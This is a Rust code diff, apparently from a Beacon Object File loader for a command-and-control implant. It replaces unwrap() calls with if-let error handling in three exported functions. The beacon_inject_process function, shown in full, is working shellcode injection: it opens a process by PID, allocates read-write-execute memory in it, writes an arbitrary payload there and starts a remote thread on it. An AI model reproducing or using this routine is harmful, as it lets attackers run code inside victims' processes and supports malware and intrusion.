@@ -372,16 +372,19 @@ extern "C" fn beacon_format_alloc(format: *mut Formatp, maxsz: c_int) {
         align *= 2;
     }
 
-    let layout = Layout::from_size_align(maxsz as usize, align).unwrap();
-    let ptr = unsafe { std::alloc::alloc(layout) };
+    let layout_result = Layout::from_size_align(maxsz as usize, align);
 
-    format_parser.original = ptr.cast::<i8>();
-    format_parser.buffer = format_parser.original;
-    format_parser.length = 0;
-    format_parser.size = maxsz;
+    if let Ok(layout) = layout_result {
+        let ptr = unsafe { std::alloc::alloc(layout) };
 
-    unsafe {
-        *format = format_parser;
+        format_parser.original = ptr.cast::<i8>();
+        format_parser.buffer = format_parser.original;
+        format_parser.length = 0;
+        format_parser.size = maxsz;
+
+        unsafe {
+            *format = format_parser;
+        }
     }
 }
 
@@ -499,9 +502,11 @@ extern "C" fn beacon_format_free(format: *mut Formatp) {
             align *= 2;
         }
 
-        let layout = Layout::from_size_align(format_parser.size as usize, align).unwrap();
+        let layout_result = Layout::from_size_align(format_parser.size as usize, align);
 
-        unsafe { std::alloc::dealloc(format_parser.original.cast::<u8>(), layout) };
+        if let Ok(layout) = layout_result {
+            unsafe { std::alloc::dealloc(format_parser.original.cast::<u8>(), layout) };
+        }
     }
 
     format_parser.original = ptr::null_mut();
@@ -653,57 +658,59 @@ extern "C" fn beacon_inject_process(
     a_len: c_int,
 ) {
     unsafe {
-        let process_handle =
-            OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, None, pid as u32).unwrap();
-        if process_handle.is_invalid() {
-            return;
-        }
-
-        let payload_slice = std::slice::from_raw_parts(payload.cast::<u8>(), p_len as usize);
-        let _arg_slice = std::slice::from_raw_parts(arg.cast::<u8>(), a_len as usize);
-
-        let remote_payload_address = VirtualAllocEx(
-            process_handle,
-            None,
-            payload_slice.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        );
-
-        if remote_payload_address.is_null() {
-            let _ = CloseHandle(process_handle);
-            return;
-        }
-
-        if WriteProcessMemory(
-            process_handle,
-            remote_payload_address,
-            payload_slice.as_ptr().cast(),
-            payload_slice.len(),
-            None,
-        )
-        .is_err()
+        if let Ok(process_handle) =
+            OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, None, pid as u32)
         {
+            if process_handle.is_invalid() {
+                return;
+            }
+
+            let payload_slice = std::slice::from_raw_parts(payload.cast::<u8>(), p_len as usize);
+            let _arg_slice = std::slice::from_raw_parts(arg.cast::<u8>(), a_len as usize);
+
+            let remote_payload_address = VirtualAllocEx(
+                process_handle,
+                None,
+                payload_slice.len(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            );
+
+            if remote_payload_address.is_null() {
+                let _ = CloseHandle(process_handle);
+                return;
+            }
+
+            if WriteProcessMemory(
+                process_handle,
+                remote_payload_address,
+                payload_slice.as_ptr().cast(),
+                payload_slice.len(),
+                None,
+            )
+            .is_err()
+            {
+                let _ = CloseHandle(process_handle);
+                return;
+            }
+
+            if let Ok(thread) = CreateRemoteThread(
+                process_handle,
+                None,
+                0,
+                Some(std::mem::transmute::<
+                    *mut std::ffi::c_void,
+                    unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+                >(remote_payload_address)),
+                None,
+                0,
+                None,
+            ) {
+                let _ = CloseHandle(thread);
+            };
+
             let _ = CloseHandle(process_handle);
-            return;
-        }
-
-        let thread = CreateRemoteThread(
-            process_handle,
-            None,
-            0,
-            Some(std::mem::transmute::<
-                *mut std::ffi::c_void,
-                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
-            >(remote_payload_address)),
-            None,
-            0,
-            None,
-        )
-        .unwrap();
-
-        let _ = CloseHandle(process_handle);
-        let _ = CloseHandle(thread);
+        };
     }
 }
 
